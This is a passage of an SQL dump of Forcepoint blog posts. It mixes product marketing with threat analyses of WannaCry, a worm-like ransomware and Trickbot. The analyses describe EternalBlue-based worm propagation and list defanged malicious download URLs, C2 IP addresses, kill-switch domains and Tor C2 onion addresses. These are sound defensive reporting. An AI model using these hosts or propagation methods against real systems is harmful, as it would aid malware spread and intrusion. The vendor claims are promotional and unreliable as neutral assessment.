.pmf .ppt .pptx .pst .pvi .py .pyc .rar .rtf .sln .sql .tar .vbox .vbs .vcb .vdi .vfd .vmc .vmdk .vmsd .vmx .vsdx .vsv .work .xls .xlsx .xvd .zip\n\nComment: In a further echo of WannaCry, the use of a single hard-coded BitCoin wallet for the receipt of payments is an unusual choice in that it allows easy third-party tracking of the number of ransom payments received [2].\n\nConclusion & recommendations\n\nConclusions and assessments of any far-reaching implications of an outbreak can be hard to draw early in a campaign, however it seems unlikely that this will be the last attempt to deploy a self-propagating piece of ransomware.\n\nAs ever, Forcepoint Security Labs will continue to monitor this threat.\n\nThe use of an SMBv1-based exploit to move laterally within networks ultimately means that a large number of recommendations made during the WannaCry outbreak are also applicable now. In particular:\n\nEnsure that available security updates are installed on all Windows machines within the organisation.\n	In line with Microsoft\'s guidance from 2016 [3], customers should consider disabling SMBv1 on all Windows systems [4] where this will not negatively impact the function of legacy systems within the environment.

The Greeks held off the Persian army for seven days at a mountain pass named Thermopylae providing critical time for Athens to be evacuated and for Greece to prepare for a final confrontation with Xerxes. The story of Leonidas and his Spartan’s has served as the inspiration for countless books and movies, including the popular “300,” and while the story provides great fodder for entertainment it also contains lessons that can be applied today in the war against cyber threats. The mountain pass that constricted the enemy’s larger force, the traitor (insider) that ultimately helped Xerxes defeat Leonidas, the evacuation of Athens, and the planning that led to Xerxes’ ultimate defeat can all be related to the defense, and ultimate defeat, of cyber threats.\n\n\n\n	The Mountain Pass\n\n\n\n	The first and perhaps most obvious analogy involves the narrow mountain pass and its value to a defending force. Historical documents describe the mountain pass as an area between a cliff and the sea only wide enough to fit a cart through in some places. From a network security perspective, the comparisons that come to mind are that of a next-generation firewall, a web or email gateway or a cross domain solution. These devices form the nexus point where attacks against a network can be defended most effectively. While network security devices provide some basic protection against threats they also serve as a force multiplier for cybersecurity solutions - just as the pass at Thermopylae did for Leonidas’ significantly outnumbered forces. By considering human behavior and the human point of interaction between people, critical data and intellectual property as part of cyber defense, a traditional network security system can be transformed into a component of an effective cybersecurity solution.\n\n\n\n	The Malicious Insider\n\n\n\n	During the first two days of the assault it is estimated that the Persians lost up to 20,000 men. By all indications the Greek force was holding their own and the Persians were reported to have been utterly perplexed. At the end of the second day the Persians received an unexpected gift. A traitor named Ephialtes, seeking a reward, brought inside information to the Persians about a parallel passage that would allow their forces to encircle the Greeks. The actions of Ephialtes provide us with an example of the potential for damage that an insider threat represents. Insider threats are not always malicious, however their intent does not negate the potential for catastrophic consequences.\n\n\n\n	Intelligent Decisions\n\n\n\n	The 7,000 men that defended the pass were not simply a rag-tag group of disorganized soldiers. Leonidas’ force consisted of soldiers from several different Greek city states in addition to his own Spartans. The Phocians, guarding a path above Thermopylae, saw the Persian forces moving along the parallel path to outflank the Greek main force. A runner communicated this back to Leonidas enabling him to make a command decision that allowed thousands of his men to retreat and fight another day. By way of comparison, within a cybersecurity context we can draw the conclusion that access to information on human behaviors, and their interaction with critical information systems, is essential to effectively combating cyber threats that may occur anywhere at any time. As companies increasingly look to the cloud to save money and expand business, the increase in attack surface requires both on premise and cloud cyber defenses to work in concert.\n\n\n\n	Forcepoint’s firewalls, gateways, cloud security and cross domain solutions create a secure nexus that acts as a force multiplier for our comprehensive suite of security technologies including our unrivaled Insider Threat and Data Loss Prevention products. Our solutions provide the narrow mountain pass and the peerless soldiers to defend it. This approach is only possible through integration of these technologies and together they provide a solid foundation from which an organization can effectively counter complex cyber threats.\n\n\n\n	In the end the Greeks repelled the Persian invasion through superior tactics and decision making. Within the realm of cybersecurity we must draw upon these valuable lessons from the past. We must address the blind spots in our security solutions, including the possibility of insider threats. We must implement holistic solutions, keeping in mind that humans are at the core of all information systems, as we work toward the ultimate goal of enabling intelligent defenses in the war against cyber threats.', 'https://www.forcepoint.com/blog/insights/what-spartans-can-teach-us-about-cybersecurity-0\n');

However, because of their different vantage points, vendors and analysts don’t always share the exact same views on a given market.\n\n\n\n	As pioneers in cloud security with a track record of continuously expanding the very definition of what it means to be a Secure Web Gateway, we have strong views about the future of this technology. Our vision for SWG goes beyond URL filtering, malware defense and tunneling options. Those things are important, but our human-centric SWG strategy encompasses more than that.  It’s about the gateway protecting every user everywhere, regardless of where they are; the roaming user support is crucial. It’s about the gateway enabling organizations to safely embrace the cloud with deep visibility and control over the use of cloud applications (for those that race into the cloud with no seatbelts!).  And finally, it’s about doing all of that with the most secure, trusted, high performance cloud available.\n\n\n\n	One area where Forcepoint agrees wholeheartedly with Gartner is that the Secure Web Gateway market continues its rapid shift toward cloud-based SWG services. We’ve invested over the years in anticipation of this shift, and we’re certainly seeing the interest within our customer base.  We’ve deployed 27 data centers around the world – each of which complies with the highest certification standards – and we recently opened new sites in Toronto, Milan, Stockholm and Warsaw.  A few months ago, we acquired CASB technology and have quickly integrated features like cloud app discovery and reporting into our Web Security product. We’ve been investing in the cloud for years and will continue to launch new innovation this year to extend our leadership across on-premises and cloud-based SWG. \n\n\n\n	Regardless of where you are in the cloud adoption lifecycle, you need solutions that match the pace of your move to the cloud.  Infrastructure is quickly migrating to the cloud, as is corporate data.  Users are commonly working from remote locations and are increasingly leaving the traditional perimeter exposed; supporting roaming worker use cases is a fundamental requirement for cloud security.\n\n\n\n	And yet, an individual organization’s move to the cloud can take years. There’s no on-off switch; digital transformation projects take time and hybrid scenarios will be common for years to come.  Deployment flexibility is incredibly important; you want to work with a vendor that offers a wide range of deployment options, from appliances and cloud-based services to hybrid deployment modes that enable gradual migration to the cloud.\n\n\n\n	We’re constantly striving to fulfill that vision, innovating around those themes and taking the Secure Web Gateway into the future. As we move forward, look for us to keep pushing boundaries in areas like:\n\n\n\n		Granular visibility & control of sanctioned cloud applications\n	\n	\n		Policy enforcement and threat protection\n	\n	\n		Content controls for both data in motion and data at rest\n	\n	\n		Holistic understanding of user risk\n	\n\n	So, if your business is moving to the cloud, come talk to us. If you care about sensitive data and the users that interact with it, come talk to us. If you have roaming users, come talk to us. If you want to accelerate your shift toward a human-centric security paradigm, come talk to us. We’re here to help, and we’re ready to share our vision of the future of Web Security and the role it plays in protecting the Human Point.\n\n\n\n	For additional reading: as always, we recommend that technology buyers consider multiple third-party perspectives when performing their due diligence. Consider IDC. They placed Forcepoint as a “Leader” in the IDC Marketscape: Worldwide Web Security 2016 Vendor Assessment and ranked Forcepoint no. 2 in share for the overall Worldwide Web Security market.

It surfaced in in the wild in September last year, initially targeting banks in Australia and the UK. It has since continually expanded its target countries and banks.\n\nThe new campaign from yesterday contained the group tag “mac1”. It downloaded configuration files that contained an updated list of targeted financial institutions. From 51 targeted URLs listed in the “dinj” configuration file just last April, the configuration file now holds 130 targeted URLs. Among these updates are 16 targeted French banks which were prepended to the configuration file. Below is a screenshot of the decrypted configuration file showing this update:\n\n\n\nFurthermore, the configuration file now also lists a number of PayPal URLs:\n\n\n\nAnother configuration file (“sinj”) has similarly been expanded: where it previously listed 109 targeted URLs, the updated one lists 333 URLs.

Malicious email campaigns such as these rely on the weakness of the human point of interaction with systems, with the final payload in this case likely having severe ramifications for those who fall prey to it.\n\nWe anticipate that Trickbot will only continue to expand its targets and Forcepoint Security Labs™ will continue to monitor developments to this threat.\n\nAdditional analysis provided by Ran Mosessco.\n\nIndicators of Compromise\n\nDownload locations\n\n\nhxxp://mybutterhalf[.]com/7gyb3ds\nhxxp://manish-choudhary[.]com/7gyb3ds\nhxxp://choralia[.]net/7gyb3ds\nhxxp://chqm168[.]com/7gyb3ds\nhxxp://shopf3[.]com/7gyb3ds\nhxxp://beursgays[.]com/7gyb3ds\nhxxp://shreekamothe[.]com/7gyb3ds\nhxxp://micolon[.]de/7gyb3ds\nhxxp://mytraveltrip[.]in/7gyb3ds\nhxxp://xinding[.]com/7gyb3ds\nhxxp://musee-champollion[.]fr/7gyb3ds\nhxxp://svagin[.]dk/7gyb3ds\nhxxp://spocom[.]de/7gyb3ds\nhxxp://muldefischer[.]de/7gyb3ds\n\nTrickbot C2\n\n\n185.6.127[.]134\n149.202.30[.]126\n212.24.110[.]76\n\nTrickbot SHA-256 Hash\n\n\n79d96a62622e4efb01fda23cf81b759e0059ad3cd3083acff7fb4174b0b3d40c', 'https://www.forcepoint.com/blog/security-labs/trickbot-spread-necurs-botnet-adds-nordic-countries-its-targets\n');

In the beginning of my career, I was on the offensive side doing penetration testing, but then I became more interested in defensive work (although #shell in the test lab still makes me grin). During the past 15 years, I’ve been running security research operations and have been privileged to work with a lot of super-smart people.\n\n\n\n	To be successful in security research requires passion – living and breathing it 24x7. That’s what we have here at Forcepoint. We love what we do because we know human-centric security is about enabling our customers to not just connect their people and data, but to also protect the points where their employees, business information and intellectual property come together and are most vulnerable. And to do so more efficiently than anyone else, without requiring armies of specialized experts or ongoing headaches.\n\n\n\n	To do this, we created a next-generation firewall (NGFW) that is unique. One that integrates deep security and centralized management into the core of the firewall rather than tossing them on after the fact. We knew this would be the best way to provide the kind of unprecedented efficiency and protection that would leave other vendors behind.\n\n\n\n	The 2017 NSS Labs NGFW test proves us right. We were the top performer of the 10 vendors in the test. We blocked 99.95% of exploits in NSS Labs’ 2017 NGFW Test. In fact, Forcepoint is the only vendor to block 100 percent of tested exploits run from the NSS Labs static exploit library and over a continuous live testing period of 31 days, we blocked 99.89% of “drive-by” exploits that target client applications. We also blocked 100% of evasions and had zero false positives. And, we did all of this while still offering one of the lowest total cost of ownership ratings as well.\n\n\n\n	How? Since malware is constantly evolving, we created a uniquely flexible architecture that enables us to easily and rapidly adapt to shifting protocols, applications and attack vectors using intelligent software. In addition, we took advantage of modern processor technology to provide acceleration for critical operations like decryption that runs fast across all environments – physical, virtual and cloud. In contrast, silicon-based products don’t have the agility to adapt to changing threats, let alone new “good” forms of applications, usage behaviors they haven’t seen before, and deployment environments. Such products often look nice for a little while, but then quickly get stuck behind. To quote Mark Andreessen, “software is eating the world.”\n\n\n\n	The Forcepoint NGFW has a software-based architecture that is deeply tuned for delivering high levels of performance, security and efficiency across different environments. It’s been a security industry leader for years – we’ve received NSS Labs’ highest rating of “Recommended” in every NGFW test they’ve ever done and were unsurpassed against even purpose-built intrusion prevention systems in last year’s NGIPS test.\n\n\n\n	\n\n\n	But then, we started focusing on blocking evasion techniques before anybody else (we pioneered the field and literally wrote the book on it). Our advanced traffic normalization prevents attackers from playing tricks with packets (which often fool other vendors’ products, but more on that another time), and we take care to perform dynamic protocol and application identification regardless of port. At the end of the day, our ability to combine inspection and analysis techniques from the lowest layers of the network up into the highest levels of advanced malware detection were what sets us apart.\n\n\n\n	“The security effectiveness of the Forcepoint NGFW 3301 was unsurpassed in the NSS Labs 2017 NGFW test,” said Thomas Skybakmoen, Distinguished Research Director at NSS Labs. “The Forcepoint NGFW should be on every company’s short list.” We couldn’t agree more.\n\n\n\n	If you’d like to learn more, you can download the results of NSS Labs’ test of the Forcepoint NGFW or visit us at Infosecurity Europe (stand F80) this week in London or the Gartner Security & Risk Management Summit (booth #303) next week in National Harbor, MD.', 'https://www.forcepoint.com/blog/insights/what-it-takes-build-best-ngfw-out-there\n');

Just a short while ago, we decided to focus on the Uber/Waymo conflict as a prism through which to understand the nature of insider threats and insider screening. Our expectation was that the litigation would be a long-running saga that would offer ample opportunity to explore some of the technology, policy, and law issues arising from compliance and control obligations.\n\n\n\n	It seems now that the saga may be racing to a quicker conclusion than we might have anticipated. Just the other day, Uber fired Anthony Levandowski, the star engineer that it lured away from Waymo with the offer of more than $250 million in Uber stock. Levandowski’s fall from grace is a cautionary story for Uber, and also for him personally.\n\n\n\n	How did he reach the nadir from such heights?  His fall began with his departure from Waymo and his alleged theft of intellectual property relating to the development of driverless car technology. The evidence of that theft was sufficiently strong (including some of the insider threat logging and control indicators) that the Federal judge hearing the Waymo v. Uber case made a separate referral of possible criminal charges to the United States Attorney’s office for San Francisco. He suggested that Levandowski might be guilty of the theft of trade secrets.\n\n\n\n	From there the ball began rolling downhill. In the civil suit between Waymo and Uber, Waymo demanded the production of evidence and documents from Uber. Uber was obliged to comply (indeed, it wanted to do so) but some of those documents were not directly in their possession – rather they were under Levandowski’s custody and control.\n\n\n\n	And that is where the plot, as they say, thickened. Faced with a possible criminal investigation, Levandowski refused to turn over the documents in his control. He asserted a Fifth Amendment privilege against self-incrimination, arguing that the documents might be used to convict him of trade secret theft. Levandowski, of course, has an absolute right to make such a claim.\n\n\n\n	But that claim put Uber in a very bad box. They needed to cooperate with the court, lest it draw an inference that it was hiding damaging information. But they couldn’t force Levandowski to produce the papers he was holding.\n\n\n\n	And so, they took the only course available to them – they fired Levandowski. Doing so protected them against the wrath of the judge. But now they may face the wrath of Levandowski. Freed from his contractual obligations and burdens of loyalty to Uber, it is possible that he may choose to cooperate with either the Federal government or with Waymo – and that might mean testifying to Uber’s complicity in his scheme.\n\n\n\n	How could it have come to this for Uber? More to the point, what could they have done to prevent it from happening? And how can they protect their reputation now that it has?\n\n\n\n	On the front end, every company should review their hiring practices and make sure that every potential employee understands that there is no room for impropriety. This is as much about the culture of the firm as it is about technical checks — an enterprise needs to make it clear that they will not tolerate the use of intellectual property that is improperly brought into the firm. A hiring enterprise like Uber should also take steps to use background checks and continuous monitoring of public records for signs of potential “tempted-ness” of a new employee – for if Levandowski was an insider threat to Waymo, he is far more likely an insider threat to Uber as well.\n\n\n\n	Once the problem has manifested itself, an enterprise’s main priority should be protecting its reputation. Uber has been hard hit lately and the Levandowski hiring just adds unfortunate fuel to the fire. An important first would be to make a quick and firm decision on the employee’s ongoing employment (kudos to Uber for doing so). The next step would be to review the employee’s hiring — who did it, what review was conducted, and are there interesting things to learn from the retrospective use of insider threat/control tools to review, for example, communications with the employee. And, finally, Uber should also use its internal controls to make absolutely sure that there are no Waymo materials whatsoever within the enterprise. That won’t solve the problem, but it will mitigate the damage.', 'https://www.forcepoint.com/blog/insights/levandowski-gets-fired\n');

Their unique insights brought various partners’ and customers’ attention to shift their thoughts on security to the forefront rather than as a mere preventive measure.\n\n\n\n	Surendra Singh, Forcepoint Country Director\n\n\n\n	Surendra Singh, Country Director at Forcepoint India  kicked off the day in each city highlighting how Forcepoint is reinventing cybersecurity by creating uncompromising systems that understand people’s behaviors and motivations as they interact with data and IP everywhere. “Only by taking a people-centric approach can security be proactive rather than just a reactive tool,” said Surendra. He further emphasized on how one should not consider IT security as just a preventive strategy but rather as a real time detection measure.\n\n\n\n	Nicolas Fischbach , CTO of Cloud\n\n\n\n	Presenting his views, Nicolas Fischbach, CTO of Cloud, explained in his keynote speech on how Cloud is about partnership between CIOs and CISOs. “At one end, where a CIO has to deliver business agility and a CISO has to take care of risk management, managing users becomes critical for both the parties,” said Nicolas. “Forcepoint understands this business requirement and helps enterprises maintain their business agility and manage risk in real time by tracking employees’ behavior and intent.”\n\n\n\n	Nicolas suggested that the CISO role has to change from restricting users from access request to enabling them in a secured way.\n\n\n\n	Brandon Swafford, CTO of Data Protection & Insider Threat\n\n\n\n	Brandon Swafford, CTO of Data Protection and Insider Threat, in his keynote spoke about the importance of identifying the behavior and intent of users and their interaction with critical business data and IP. “Organisations should detect individuals who are behaving in ways that pose high security risk by understanding the user’s behavior and the context around it, said Brandon. “These could be emotionally stressed employees, those who want to hurt themselves, those who want to hurt the others and those employees who are stressed and want to escape,” he added.\n\n\n\n	Overall, the Forcepoint Solution Day was well received by attendees who got a ringside view of emerging risks in the cyber world and the need for real-time corrective measures. The event drew in technology journalists from top media houses in India who got a perspective on The Human Point and how employees’ behavior and intent are the link to emerging cybersecurity threats. Several of them including The Economic Times, Business World and Enterprise Innovation have reported about the need of understanding the human behavior as a key to enterprise security.\n\n\n\n	What the Industry is Saying About Forcepoint\'s India Solution Day:\n\n\n\n		BW CIO                    \n	\n	\n		Enterprise IT World   \n	\n	\n		The Economic Times', 'https://www.forcepoint.com/blog/insights/forcepoint-india-solution-day\n');

Breaches expand in scope and severity over time, so responders must act quickly yet carefully to identify and remediate threats to minimize the impact to the business. In “Alexsey’s TTPs (Tactics, Techniques, and Procedures)” incident responder Chris McNab shares his work in dealing with compromises of the computing infrastructure within large technology companies. The attacks he describes often start with the compromise of Linux servers and the use of infected Linux systems to harvest credentials that give the attacker access to additional systems.\n\nWhether attackers exploit weaknesses at the ‘human point’, where users interact with systems and critical business data, or penetrate networks by other means, organizations must be prepared to respond to a breach. This applies to any part of their computing infrastructure, including Linux servers in data centers or the cloud. Effective response requires an understanding of the tools available to reveal the location and nature of malicious code and other artifacts.\n\nMemory forensics is an essential step of cyber incident response, both to preserve evidence in volatile memory, as well as to uncover malware and other attack-related artifacts from memory. In scenarios like the ones described by McNab, memory forensics can reveal keyloggers, credential stealers and tools used to clean up or hide evidence of a compromise, such as rootkits.\n\n\n\n \n\nThe screenshot above shows a task listing from a memory integrity scan of an Amazon EC2 instance. The highlighted task, while appearing normal to a surface-level inspection, in fact contains malicious injected code.\n\nDespite the value it can offer, when it comes to security incidents in enterprise or cloud Linux server environments, memory forensics is often seen as too complicated or time-consuming to pursue. Some of the most common challenges faced by those attempting to implement Linux memory forensics at scale include:\n\nInability to gather full memory dumps from large numbers of active servers with large amounts of memory: issues include blurring, storage, and transfer of GBs of RAM\n	Lack of compatible metadata and memory analysis algorithms: these must match the kernel versions of deployed systems for memory forensics to be successful; community-maintained resources are often outdated or incomplete\n	Ineffective manual anomaly detection: hoping to spot the evil in long lists of running processes or loaded modules is not realistic – highlighting suspicious aspects of a system must be automated for use at scale\nTo successfully use memory forensics for Linux incident response these challenges must be addressed. First and foremost, security teams should implement a solution that automates memory acquisition and analysis tasks, with broad support for different versions of Linux. Next, a Linux memory forensics solution should provide detailed reporting and alerting on potential malware found in memory. It should also be able to perform efficient remote memory analysis, scanning systems using targeted acquisition, which yields rapid results without the overhead of a full memory dump.\n\nIdeally, a security team responsible for Linux infrastructure should implement a memory forensics solution that can quickly acquire and analyze memory across their entire Linux environment. A solution of this nature enables the team to use memory forensics not only during incident response, but also proactively to hunt for currently unknown and undetected threats.\n\nForcepoint Threat Protection for Linux (formerly Second Look®) is an enterprise- and cloud-ready solution that uses memory forensics to enable security teams to detect threats and respond to incidents on Linux systems. Automating the tasks of comprehensive memory acquisition and analysis, with detailed reporting and alerting, it has solved the Linux memory forensics problem for you, performing rapid memory integrity scans across even large-scale Linux environments. This allows security teams to do their jobs faster and more effectively, reducing dwell time and, most importantly, the cost and business impact of security incidents.\n\n\n\n \n\nThe screenshot above shows the malicious shared object file that was injected into the process in the first screenshot. The dropdown menu makes it easy to navigate among the wealth of information produced by the memory integrity scan.\n\nForcepoint offers a free demo environment that can perform memory integrity scans of any system with a public IP address. It will provide you with a first-hand evaluation based on your own, real-world systems. You’ll see results quickly, and gain a tool you can use to detect and respond to attacks on your Linux-based infrastructure like those described by McNab.\n\nMore Information:\n\nForcepoint Security Labs Blog: Detecting Register-Hooking Linux Rootkits with Forcepoint Second Look\n	Forcepoint Security Labs Blog: The Horse Pill Rootkit vs. Forcepoint Threat Protection for Linux\n	Case Study: Global Trading Firm Detects Advanced Linux Threats with Forcepoint Threat Protection for Linux\n	Splunkbase: Forcepoint Threat Protection for Linux (Second Look) - App for Splunk', 'https://www.forcepoint.com/blog/insights/using-memory-forensics-effectively-linux-incident-response-and-threat-hunting\n');

These updates can be downloaded now from the Forcepoint Support Portal.\n\n\n\n	Among the 15 features and updates we launched today, I’d like to highlight four in this post:\n\n\n\n		Forcepoint Web Security cloud application discovery and risk reporting\n	\n	\n		Forcepoint CASB and Forcepoint Advanced Malware Detection integration\n	\n	\n		Forcepoint DLP for Web and Email Incident Risk Ranking\n	\n	\n		Forcepoint Trusted Cloud Data Center expansions in North America and Europe\n	\n\n	IT organizations lack the total control they once had to evaluate and deploy safe applications into the enterprise. Increasingly the technology budget is under direct control of the business unit leader who may fund cloud application subscriptions and cloud development projects without the in depth understanding of the associated compliance requirements or data protection best practices. IT is always responsible for determining the risk and preventing the loss of data.\n\n\n\n	Forcepoint understands the need to securely embrace innovation, cloud apps and mobility – and to do so easily without requiring yet another appliance to procure and manage. That’s why Forcepoint Web Security 8.3 now includes cloud application discovery and risk reporting, new features aimed at eliminating those Shadow IT blind spots. Because you can’t protect what you can’t see.\n\n\n\n	Forcepoint Web Security - Cloud Application Risk Reporting\n\n\n\n	Forcepoint Web Security utilizes the same cloud app catalog and risk scoring engine as our CASB product, giving customers the ability to better visualize cloud app adoption, usage volume, and risk exposure as a result of Shadow IT. And with GDPR on the horizon, gaining (and maintaining) visibility of risky applications in your organization may be a competitive advantage.\n\n\n\n	For organizations seeking more control of sanctioned cloud use, Forcepoint CASB provides the visibility and control of applications like Office 365 and Infrastructure as a Service (IaaS) platforms including Azure and AWS. But what really makes this announcement timely in the wake of recent malware attacks like WannaCry is the Forcepoint Advanced Malware Detection (AMD) integration that delivers added protection from malware to your information stored in cloud storage services. This layer is fast becoming a requirement in today’s mobile environment.\n\n\n\n	Forcepoint CASB real-time reporting of ransomware encryption of files on Google Drive.\n\n\n\n	Not all threats come from outside the organization. Some threats to your IP come from your users’ accidental or even malicious exfiltration of data. Forcepoint is leading the industry in understanding the human interaction with critical business data and technology – or simply the human point. Last year Forcepoint DLP introduced Incident Risk Ranking (IRR)  in our data loss prevention (DLP) product, an innovation in risk-based data modeling that applies statistical data modeling and behavioral baselines to automatically identify and cluster incidents. Today this IRR feature is included in Web Security and Email Security products when DLP is added on. The integration of IRR with Web Security and Email Security makes it easier for security admins and investigators to quickly assess employee behaviors and prioritize responses to true insider threats from compromised or malicious intent instead of inadvertent errors caused by lack of awareness and broken business processes.\n\n\n\n	\n	 \n\n\n\n	IRR with Web Security DLP Incidents\n\n\n\n	You have choices when it comes to cloud hosted security and Forcepoint continues a tradition of securing web and email traffic with an expansion of our global cloud data centers and certifications.

If this port is found to be open, it attempts to use the EternalBlue exploit, waiting ten minutes to see if the exploitation attempt has succeeded. If the thread times out, it terminates and a new one is created to try the next address.\n\nIf after the first EternalBlue attempt the presence of the DoublePulsar backdoor is detected, the malware will attempt to use this instead. Otherwise, further EternalBlue attempts will be made.\n\nIn the sample analysed, the number of internal propagation threads was capped at ten (see image below). After the initial ten threads are spawned, the malware will sleep until one of those threads terminates before attempting to spread to another address.\n\n\n\nExternal propagation\n\nAttempts to propagate externally occur concurrently with the internal propagation attempts, but in a slightly different manner. For the purposes of spreading to IP addresses external to the organisation, the malware creates 128 threads, one-by-one, each two seconds apart. These threads employ an IP generation function using srand() - seeded with the current thread ID, time, and tick count - and random() to generate a /24 subnet to scan (see image below). If an open SMB port is found, a new thread is started calling the same EternalBlue /DoublePulsar exploit function as used internally but with a sixty minute timeout.\n\n\n\nImplications\n\n\nComment: A significant implication of this method of propagation is that the malware requires a \'bridgehead\' into the network with a routable IP address. As few organisations assign routable addresses to their workstations, it seems highly likely that the bridgehead machine in most cases would have been a server of some sort exposing SMB services to the Internet. The malware\'s use of the DoublePulsar backdoor may also suggest that a degree of \'piggy-backing\' was involved: organisations already compromised by earlier activity - e.g. the cryptocurrency mining botnet discovered only as a result of the WannaCry outbreak [1] - will potentially have been infiltrated via this pre-existing backdoor.\n\nThat each instance of the worm functionality spawns threads scanning a total of 128 external subnets goes a long way to accounting for the rapid spread of the malware: in organisations where large numbers of workstations were affected and where permissive firewall policies were in place, it appears that every one of these infected machines may have been trying to infect up to 128 routable /24 subnets a piece.\n\n\nProtection statement\n\nForcepoint™ customers are protected against this threat via NGFW at the following stages of attack:\n\nStage Four (Exploit Kit) - The EternalBlue exploit attempts are blocked.\n\nConclusion\n\nAs of the time of writing, the reported rate of infections appears to have subsided significantly. Furthermore, much feared \'round two\' variants have either not materialised or failed to have the same impact as the Friday\'s initial outbreak. Nonetheless, what are presumably ransom payments continue to trickle into the three hard-coded Bitcoin wallets used by the campaign: totalled up, the three wallets contained approximately BTC 32.5 (USD $55,000 approx.) late on Monday 15 May 2017 and this figure has risen to BTC 39.0 (USD $68,000 approx.) as of 12:00 UTC on Tuesday 16 May 2017.\n\n\nComment: For a campaign with such significant and global reach the financial returns for the actors are relatively low. Figures obtained from the Bitcoin wallets used suggest that fewer than 200 ransom demands have been paid out of over 200,000 machines reportedly affected [2]. The amount contained in the Bitcoin wallets is, of course, also related to the ransom amount demanded by the attackers, with a USD $300 ransom appearing very low compared to recent campaigns observed demanding over ten times this amount [3].\n\nPerhaps the most striking potential outcome of this campaign is the damage it has likely done to other malicious actors wishing to capitalise on organisations who had yet to respond to the exploits published by the Shadow Brokers earlier this year: while other campaigns also used the EternalBlue exploit, they managed to do so while keeping a low profile. The intensely high profile nature of this attack will likely see much of the EternalBlue attack surface - which malicious actors were no doubt hoping would remain available for as long as possible - closed sooner rather than later.\n\n\nFor additional information and protection advice, please see our earlier blog post at /security-labs/wannacry-ransomware-worm-targets-unpatched-systems\n\nReferences\n\n[1] https://twitter.com/kafeine/status/864283100385357824\n\n[2] http://www.cnbc.com/2017/05/15/wannacry-ransomware-hackers-have-only-made-50000-worth-of-bitcoin.html\n\n[3] /security-labs/jaff-enters-ransomware-scene-locky-style', 'https://www.forcepoint.com/blog/security-labs/wannacry-post-outbreak-analysis\n');
INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (88, 'WannaCry ransomware-worm targets unpatched systems', 'Forcepoint Security LabsJohn BergbomForcepoint Sec', '\n      \n    \n      \n      \n   ', 'Updated Tuesday 16 May 2017.\n\nAnalysis\n\nRecent campaigns have tended to be in the form of trojans: pieces of malware that typically arrive on a machine via social engineering tactics and then conduct their malicious behaviour (be that data exfiltration, file encryption, or something else) locally on that machine. The malware used in this outbreak - named variously WannaCry, WCry, and WannaCrypt0r 2.0 - was ultimately of a different family: a worm. Worms have the ability to self-propagate once they are inside an organisation, spreading from machine to machine using unpatched vulnerabilities in the Windows operating system. In this case the malware used the EternalBlue vulnerability for which Microsoft made a patch available through MS17-010 in March 2017.\n\nThe initial entry to an organisation in this case appears to have been through a low-volume email campaign linking to a compromised website. If the email makes it through to an end user and they click on the link it starts a chain of events that leads to the download of the WannaCry ransomware worm. The malware then sets about finding vulnerable computers on the network, copying itself to these machines, encrypting their files, and demanding a $300 ransom.\n\n\n\nThe malware also changes the background on the affected machine:\n\n\n\nThe actors behind the malware appear to be using multiple Bitcoin wallets to receive payments. At the time of writing, the wallet referred to in the image above had received a total of 23 transactions totaling 4.266 Bitcoins (approximately $7,400 USD) [1], but this is likely only a small fraction of the revenue generated by this campaign.\n\nConclusions\n\nForcepoint users were protected from the initial email by our email, web security, and NGFW security products, but the nature of this attack is that one email missed or accidentally released from quarantine can leave an organisation vulnerable to having its systems encrypted. As we observed in our blog post on the Jaff ransomware earlier this week, taking a defence-in-depth approach to security ensures that an attack can potentially be stopped in several points along the kill chain.\n\nAs with any email-based campaign user education is a critical component of limiting these attacks: if self-propagating ransomware becomes the new paradigm the risks posed to organisations by a user - however unintentionally - following a malicious link or opening a malicious file are multiplied greatly. Beyond this, the MS17-010 vulnerability exploited by this malware has been patched for nearly two months. This goes some way to explain the significant variation in impact seen within different organisations and highlights the need for a robust and timely patching process.\n\nAs of 13 May 2017, it has been confirmed that the malware will not spread if it can contact a hard-coded \'kill-switch\' domain: hxxp://www[.]iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com\n\nAs always, Forcepoint Security Labs will continue to investigate and monitor this new threat.\n\nUpdate: Sunday 14 May 2017\n\nAs expected, a new variant of WannaCry has been released without the kill-switch feature. The Forcepoint product suite continues to provide protection against this new variant.\n\nUpdate: Monday 15 May 2017\n\nIn addition to the version identified with no kill-switch feature, an additional version with an alternate kill-switch has been positively identified: hxxp://www[.]ifferfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com\n\nWhile the most obvious Indicators of Compromise (IOCs) for this campaign are the changed desktop background and ransom message shown above, a number of other behavioural artefacts have been documented which, in the absence of the ransom message, may be indicative of a partial or failed attack. These are listed below:\n\nKill-Switch URLs\n\nNote Requests for these domains have, to date, only been recorded as shown above: i.e. an HTTP (not HTTPS) request for the www domain only, with no appended path.\n\n\nhxxp://www[.]iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com\nhxxp://www[.]ifferfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com\n\n\nTor Hidden Service (Onion Site) Command & Control Servers\n\nNote Connections to Tor nodes alone should not be treated as an IOC for WannaCry. These connections are relevant only when combined with other IOCs.\n\n\ngx7ekbenv2riucmf.onion\n57g7spgrzlojinas.onion\nxxlvbrloxvriy2c5.onion\n76jdd2ir2embyv47.onion\ncwwnhwhlz52maqm7.onion\n\nRequests to Tor Hidden Services must be made via the Tor network - the malware itself installs a Tor client to this end. As a result of this behaviour, organisations may see one or more Tor nodes being contacted by infected machines. Connections to Tor typically occur across port 9001/TCP, but many other ports (including 443/TCP) are also in use. The list of Tor nodes changes frequently, but several websites including https://torstatus.blutmagie.de/ and https://www.dan.me.uk/tornodes provide extensive lists of nodes against which observed IP addresses can be checked.\n\nUpdate: Tuesday 16 May 2017\n\nForcepoint Security Labs have now published an in-depth analysis of the EternalBlue propagation method used by the WannaCry campaign. This can be found here: /security-labs/wannacry-post-outbreak-analysis\n\nUpdate: Thursday 18 May 2017\n\nAfter extensive analysis of the email campaigns initially considered to have potential links with the WannaCry campaign launched on Friday 12 May 2017, Forcepoint Security Labs have found no evidence to date of an initial lure.\n \nThere is strong evidence to suggest that the rapid spread of the malware after the initial outbreak was identified was solely a result of the self-propagation capability which so characterizes this campaign (see /security-labs/wannacry-post-outbreak-analysis for further analysis of this capability).\n \nThese findings do not necessarily preclude the existence of a very low volume email campaign containing either a malicious attachment or download URL in order to infect ‘Patient Zero’ with the WannaCry malware. However, the possibility must be considered that such a campaign either: (a) does not exist, forcing the conclusion that initial infection was by the same means as the subsequent propagation; or (b) exists, but is unlikely to ever be identified for this outbreak.\n \nForcepoint Security Labs will continue to monitor email telemetry for indicators 